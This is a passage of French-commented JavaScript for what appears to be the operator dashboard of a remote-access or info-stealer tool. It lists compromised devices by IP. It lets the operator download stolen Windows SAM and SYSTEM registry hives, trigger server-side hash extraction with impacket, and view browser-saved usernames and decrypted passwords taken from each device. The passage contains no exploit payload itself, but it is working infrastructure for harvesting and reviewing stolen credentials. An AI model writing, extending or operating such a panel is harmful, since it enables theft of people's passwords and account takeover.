    credsCoupleDetailEl.innerHTML = `
        <div class="creds-couple-card">
            <div class="creds-couple-header">
                <span class="creds-couple-title"><i class="fas fa-database"></i> HIVE SAM SYSTEM — ${couple.ip}</span>
                <span class="creds-couple-date">${dateTimeStr}</span>
            </div>
            <div class="creds-couple-actions">
                <a href="${API_URL}/creds/${encodeURIComponent(couple.samFile.filename)}" class="creds-couple-btn" download><i class="fas fa-download"></i> Télécharger SAM</a>
                <a href="${API_URL}/creds/${encodeURIComponent(couple.systemFile.filename)}" class="creds-couple-btn" download><i class="fas fa-download"></i> Télécharger SYSTEM</a>
                ${hasHash ? `<a href="${API_URL}/creds/hashes/${encodeURIComponent(firstHashFile.filename)}" class="creds-couple-btn creds-couple-btn-hash" download><i class="fas fa-download"></i> Télécharger hash${hashFiles.length > 1 ? ' (1/' + hashFiles.length + ')' : ''}</a>` : ''}
                <button type="button" class="creds-couple-btn creds-couple-extract-btn ${hasHash ? 'creds-extract-disabled' : ''}" ${hasHash ? ' disabled' : ''} data-ip="${couple.ip.replace(/"/g, '&quot;')}" data-sam="${(couple.samFile.filename || '').replace(/"/g, '&quot;')}" data-system="${(couple.systemFile.filename || '').replace(/"/g, '&quot;')}"><i class="fas fa-unlock-alt"></i> Extraire les hash</button>
            </div>
            <div class="creds-couple-hash-area"></div>
        </div>
    `;
    const card = credsCoupleDetailEl.querySelector('.creds-couple-card');
    const hashArea = card.querySelector('.creds-couple-hash-area');
    const extractBtn = card.querySelector('.creds-couple-extract-btn');
    if (hashFiles.length > 0) {
        loadHashContent(hashArea, hashFiles.map(f => f.filename));
    }
    if (!hasHash) {
        extractBtn.addEventListener('click', async (e) => {
            e.preventDefault();
            const ip = extractBtn.getAttribute('data-ip');
            const sam = extractBtn.getAttribute('data-sam');
            const system = extractBtn.getAttribute('data-system');
            if (!ip || !sam || !system) return;
            hashArea.innerHTML = '<p class="creds-hash-loading">Extraction en cours...</p>';
            extractBtn.disabled = true;
            try {
                const response = await fetch(`${API_URL}/creds/extract`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_ip: ip, files: [sam, system] })
                });
                const data = await response.json().catch(() => ({}));
                const hashesStr = typeof data.hashes === 'string' ? data.hashes : (data.hashes ? String(data.hashes) : '');
                const errMsg = data.error || data.message || '';
                if (hashesStr.length > 0) {
                    renderHashContent(hashArea, hashesStr);
                    await fetchCreds();
                    const list = credsByDevice[ip];
                    if (list && list.length > 0) {
                        const updated = list.find(c => c.samFile.filename === sam && c.systemFile.filename === system) || list[0];
                        showCredsCoupleDetail(updated);
                    } else {
                        renderCredsDatesList(ip);
                    }
                } else {
                    hashArea.innerHTML = '';
                    const pre = document.createElement('pre');
                    pre.className = 'creds-couple-hash-pre';
                    pre.textContent = errMsg || 'Aucune sortie. Vérifier impacket sur le serveur (pip install impacket).';
                    hashArea.appendChild(pre);
                }
            } catch (err) {
                hashArea.innerHTML = '';
                const pre = document.createElement('pre');
                pre.className = 'creds-couple-hash-pre';
                pre.textContent = 'Erreur réseau: ' + err.message;
                hashArea.appendChild(pre);
            } finally {
                extractBtn.disabled = false;
            }
        });
    }
}

// Variables pour les credentials navigateur
let navigatorCredsCache = [];
let navigatorCredsByDevice = {};

// Gestion des onglets credentials
const credsTabBtns = document.querySelectorAll('.creds-tab-btn');
const credsTabContents = document.querySelectorAll('.creds-tab-content');

credsTabBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        const targetTab = btn.getAttribute('data-tab');
        
        // Désactiver tous les onglets
        credsTabBtns.forEach(b => b.classList.remove('active'));
        credsTabContents.forEach(c => c.classList.remove('active'));
        
        // Activer l'onglet sélectionné
        btn.classList.add('active');
        document.getElementById(`creds-tab-${targetTab}`).classList.add('active');
        
        // Charger les données si nécessaire
        if (targetTab === 'navigator') {
            fetchNavigatorCreds();
        }
    });
});

// Fonction pour récupérer les credentials navigateur
async function fetchNavigatorCreds() {
    try {
        const res = await fetch(`${API_URL}/creds/navigator`);
        const data = await res.json();
        const navigatorFiles = data.navigator || [];
        
        navigatorCredsCache = navigatorFiles;
        navigatorCredsByDevice = {};
        
        // Grouper par device IP
        navigatorFiles.forEach(file => {
            const ip = file.device_ip || 'unknown';
            if (!navigatorCredsByDevice[ip]) {
                navigatorCredsByDevice[ip] = [];
            }
            navigatorCredsByDevice[ip].push(file);
        });
        
        // Trier chaque groupe par timestamp décroissant
        Object.keys(navigatorCredsByDevice).forEach(ip => {
            navigatorCredsByDevice[ip].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
        });
        
        renderNavigatorCreds();
    } catch (error) {
        console.error('Erreur chargement creds navigator:', error);
        credsNavigatorListEl.innerHTML = '<p class="empty-msg">Erreur de chargement.</p>';
    }
}

// Fonction pour afficher les credentials navigateur
function renderNavigatorCreds() {
    credsNavigatorListEl.innerHTML = '';
    
    const ips = Object.keys(navigatorCredsByDevice).sort();
    
    if (ips.length === 0) {
        credsNavigatorListEl.innerHTML = '<p class="empty-msg">Aucun credential navigateur disponible.</p>';
        return;
    }
    
    ips.forEach(ip => {
        const files = navigatorCredsByDevice[ip];
        
        // Créer un conteneur pour chaque device
        const deviceContainer = document.createElement('div');
        deviceContainer.className = 'creds-navigator-device';
        
        const deviceHeader = document.createElement('div');
        deviceHeader.className = 'creds-navigator-device-header';
        deviceHeader.innerHTML = `
            <span class="creds-navigator-device-ip"><i class="fas fa-desktop"></i> ${ip}</span>
            <span class="creds-navigator-device-count">${files.length} fichier${files.length > 1 ? 's' : ''}</span>
        `;
        deviceContainer.appendChild(deviceHeader);
        
        // Liste des fichiers pour ce device
        const filesList = document.createElement('div');
        filesList.className = 'creds-navigator-files';
        
        files.forEach(file => {
            const fileItem = document.createElement('div');
            fileItem.className = 'creds-navigator-file-item';
            
            const dateTimeStr = formatCredsDateTime(file.timestamp || file.created);
            fileItem.innerHTML = `
                <div class="creds-navigator-file-info">
                    <span class="creds-navigator-file-date"><i class="fas fa-calendar-alt"></i> ${dateTimeStr}</span>
                    <span class="creds-navigator-file-name">${file.filename}</span>
                </div>
                <button class="creds-navigator-view-btn" data-filename="${file.filename.replace(/"/g, '&quot;')}">
                    <i class="fas fa-eye"></i> Voir
                </button>
            `;
            
            const viewBtn = fileItem.querySelector('.creds-navigator-view-btn');
            viewBtn.addEventListener('click', () => showNavigatorCredsDetail(file.filename));
            
            filesList.appendChild(fileItem);
        });
        
        deviceContainer.appendChild(filesList);
        credsNavigatorListEl.appendChild(deviceContainer);
    });
}

// Fonction pour afficher le détail d'un fichier navigator
async function showNavigatorCredsDetail(filename) {
    try {
        const res = await fetch(`${API_URL}/creds/navigator/${encodeURIComponent(filename)}`);
        const data = await res.json();
        
        const credentials = data.credentials || [];
        const deviceIp = data.device_ip || 'unknown';
        const timestamp = data.timestamp || data.created || 0;
        const debug = data.debug || [];
        
        const dateTimeStr = formatCredsDateTime(timestamp);
        
        // Créer un modal pour afficher les détails
        const detailModal = document.createElement('div');
        detailModal.className = 'modal active';
        detailModal.innerHTML = `
            <div class="modal-content creds-navigator-detail-content">
                <div class="modal-header">
                    <h2><i class="fas fa-globe"></i> Credentials Navigateur — ${deviceIp}</h2>
                    <button class="close-modal">&times;</button>
                </div>
                <div class="modal-body">
                    <div class="creds-navigator-detail-info">
                        <p><strong>Date:</strong> ${dateTimeStr}</p>
                        <p><strong>Fichier:</strong> ${filename}</p>
                        <p><strong>Nombre de credentials:</strong> ${credentials.length}</p>
                    </div>
                    <div class="creds-navigator-credentials-list">
                        ${credentials.length > 0 ? credentials.map(cred => `
                            <div class="creds-navigator-cred-item">
                                <div class="creds-navigator-cred-header">
                                    <span class="creds-navigator-cred-url"><i class="fas fa-link"></i> ${cred.url || 'N/A'}</span>
                                    <span class="creds-navigator-cred-profile">${cred.profile || 'N/A'}</span>
                                </div>
                                <div class="creds-navigator-cred-details">
                                    <div class="creds-navigator-cred-field">
                                        <strong>Username:</strong> <span>${cred.username || '[AUCUN USERNAME]'}</span>
                                    </div>
                                    <div class="creds-navigator-cred-field">
                                        <strong>Password:</strong> <span class="${cred.password === '[DÉCHIFFREMENT ÉCHOUÉ]' ? 'creds-navigator-password-failed' : 'creds-navigator-password-success'}">${cred.password || '[DÉCHIFFREMENT ÉCHOUÉ]'}</span>
                                    </div>
                                </div>
                            </div>
                        `).join('') : '<p class="empty-msg">Aucun credential trouvé.</p>'}
                    </div>
                    ${debug.length > 0 ? `
                        <div class="creds-navigator-debug-section">
                            <button class="creds-navigator-debug-toggle" type="button">
                                <i class="fas fa-chevron-down"></i> Afficher les détails debug
                            </button>
                            <div class="creds-navigator-debug" style="display: none;">
                                <h3><i class="fas fa-bug"></i> Debug</h3>
                                <pre class="creds-navigator-debug-pre">${debug.join('\n')}</pre>
                            </div>
                        </div>
                    ` : ''}
                </div>
            </div>
        `;
        
        document.body.appendChild(detailModal);
        
        // Gérer la fermeture
        const closeBtn = detailModal.querySelector('.close-modal');
        closeBtn.addEventListener('click', () => {
            detailModal.remove();
        });
        
        detailModal.addEventListener('click', (e) => {
            if (e.target === detailModal) {
                detailModal.remove();
            }
        });
        
        // Gérer le toggle de la section debug
        if (debug.length > 0) {
            const debugToggle = detailModal.querySelector('.creds-navigator-debug-toggle');
            const debugSection = detailModal.querySelector('.creds-navigator-debug');
            if (debugToggle && debugSection) {
                debugToggle.addEventListener('click', () => {
                    const isHidden = debugSection.style.display === 'none';
                    debugSection.style.display = isHidden ? 'block' : 'none';
                    const icon = debugToggle.querySelector('i');
                    if (icon) {
                        icon.className = isHidden ? 'fas fa-chevron-up' : 'fas fa-chevron-down';
                    }
                    debugToggle.innerHTML = isHidden 
                        ? '<i class="fas fa-chevron-up"></i> Masquer les détails debug'
                        : '<i class="fas fa-chevron-down"></i> Afficher les détails debug';
                });
            }
        }
        
    } catch (error) {
        console.error('Erreur chargement détail navigator:', error);
        alert('Erreur lors du chargement des détails: ' + error.message);
    }
}

credsBtn.onclick = () => {
    fetchCreds();
    credsModal.classList.add('active');
};

// Fermer creds modal avec les autres modals (déjà géré par .close-modal)

// Initial load
fetchClients();
updateAlbumCount();

// Refresh client list every 5 seconds
setInterval(fetchClients, 5000);
// Refresh album count every 10 seconds
setInterval(updateAlbumCount, 10000);
